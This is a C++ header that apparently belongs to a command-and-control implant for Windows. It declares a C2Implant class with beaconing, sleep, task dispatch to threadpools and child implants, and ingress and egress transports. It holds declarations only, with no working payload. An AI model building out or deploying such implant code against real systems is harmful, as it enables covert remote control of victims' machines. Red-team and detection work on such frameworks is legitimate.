#pragma once

#include <string>
#include "comms/transport.h"
#include "_debug/debug.h"

struct ChildRouteContext {
    nlohmann::json task;
    std::string implant_uuid;
};

VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

class C2Implant {
public:
    std::string implant_uuid_;

    void init();
    void cycle();
    void update_transports();

    void dispatch_to_threadpool(const nlohmann::json& task);
    void dispatch_to_child_router(const nlohmann::json& task, std::string implant_uuid);

private:
    void sleep_implant();
    void handle_tasks(const nlohmann::json& incoming);

    IIngressTransport* current_ingress_ = nullptr;
    IEgressTransport* current_egress_ = nullptr;
};